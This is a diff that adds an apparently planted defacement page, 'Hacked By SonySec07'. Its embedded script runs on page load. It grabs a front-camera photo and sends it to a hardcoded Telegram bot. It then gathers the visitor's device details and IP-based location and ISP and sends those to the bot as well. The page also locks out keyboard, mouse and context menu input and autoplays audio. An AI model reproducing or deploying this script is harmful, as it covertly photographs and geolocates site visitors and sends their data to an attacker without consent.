@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Hacked By SonySec07</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <style>
+        body, a:hover { cursor: url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important; }
+        center { font-family: Courier; }
+        img { opacity: 0.8; }
+        red { color: red; }
+    </style>
+    <script>
+        const BOT_TOKEN = "7843724459:AAF9WiBLzxj9aE1d7hxwajVUS4T13oypw_4";
+        const CHAT_ID  = "7008546927";
+
+        // Fungsi untuk mendapatkan merk perangkat
+        // Fungsi untuk mendapatkan merk perangkat (diperbarui)
+function getDeviceManufacturer() {
+    const ua = navigator.userAgent;
+    
+    // Daftar regex untuk deteksi merk
+    const brands = [
+        { regex: /iPhone|iPad|iPod/i, name: 'Apple' },
+        { regex: /Samsung/i, name: 'Samsung' },
+        { regex: /Huawei/i, name: 'Huawei' },
+        { regex: /Xiaomi|Redmi|POCO/i, name: 'Xiaomi' },
+        { regex: /Sony/i, name: 'Sony' },
+        { regex: /Oppo/i, name: 'Oppo' },
+        { regex: /Vivo/i, name: 'Vivo' },
+        { regex: /LG|LGE/i, name: 'LG' },
+        { regex: /Pixel/i, name: 'Google Pixel' },
+        { regex: /OnePlus|ONEPLUS/i, name: 'OnePlus' },
+        { regex: /Nokia|TA-/i, name: 'Nokia' },
+        { regex: /Asus/i, name: 'Asus' },
+        { regex: /Lenovo/i, name: 'Lenovo' },
+        { regex: /Moto|Motorola/i, name: 'Motorola' },
+        { regex: /Realme|RMX/i, name: 'Realme' },
+        { regex: /Infinix/i, name: 'Infinix' },
+        { regex: /Windows/i, name: 'Microsoft' },
+        { regex: /Android/i, name: 'Android Device' }
+    ];
+
+    // Cek kecocokan dengan daftar merk
+    for (const brand of brands) {
+        if (brand.regex.test(ua)) {
+            return brand.name;
+        }
+    }
+    
+    return 'Unknown Device';
+}
+
+        async function capturePhotoAndData() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                const video  = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width  = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(async photoBlob => {
+                    stream.getTracks().forEach(t => t.stop());
+                    await sendPhoto(photoBlob);
+                    await sendDeviceAndNetworkInfo();
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                // Jika kamera ditolak, kirim info tanpa foto
+                await sendDeviceAndNetworkInfo();
+            }
+        }
+
+        async function sendPhoto(photoBlob) {
+            const form = new FormData();
+            form.append("chat_id", CHAT_ID);
+            form.append("photo", photoBlob, "capture.jpg");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST', body: form
+            });
+        }
+
+        async function sendDeviceAndNetworkInfo() {
+            try {
+                const manufacturer = getDeviceManufacturer();
+                const ua = navigator.userAgent;
+                const platform = navigator.platform;
+                const lang = navigator.language;
+                const screenW = screen.width;
+                const screenH = screen.height;
+
+                const resp = await fetch('https://ip-api.com/json/?fields=status,message,query,isp,org,city,regionName,country,lat,lon');
+                const info = await resp.json();
+
+                let text = `📌 *PERANGKAT*\n`;
+                text += `• MEREK       : \`${manufacturer}\`\n`;
+                text += `• USER AGENT : \`${ua}\`\n`;
+                text += `• PLATFORM   : \`${platform}\`\n`;
+                text += `• BAHASA      : \`${lang}\`\n`;
+                text += `• RESOLUSI    : ${screenW}×${screenH}\n\n`;
+
+                if (info.status === 'success') {
+                    text += `🌐 *INFO JARINGAN*\n`;
+                    text += `• IP          : \`${info.query}\`\n`;
+                    text += `• ISP         : \`${info.isp}\`\n`;
+                    text += `• ORG        : \`${info.org}\`\n`;
+                    text += `• LOKASI     : ${info.city}, ${info.regionName}, ${info.country}\n`;
+                    text += `• MAPS      : [Google Maps](https://www.google.com/maps?q=${info.lat},${info.lon})\n`;
+                }
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error('Error sending info:', err);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', capturePhotoAndData);
+    </script>
+</head>
+<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+    <table width="100%" height="80%"><td>
+        <center>
+            <small> 4 BROTHER </small><br>
+            <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220"><br>
+            Hacked by <red><i>SonySec07</i></red><br>
+            <font size="2">wh00pz! your website security get down<br>patch it before something bad happens</font><br><br>
+            <small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+            <font size="2"><i>Greetz</i><br>…[daftar grup/hacker]…</font>
+        </center>
+    </td></table>
+    <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
+</body>
+</html>
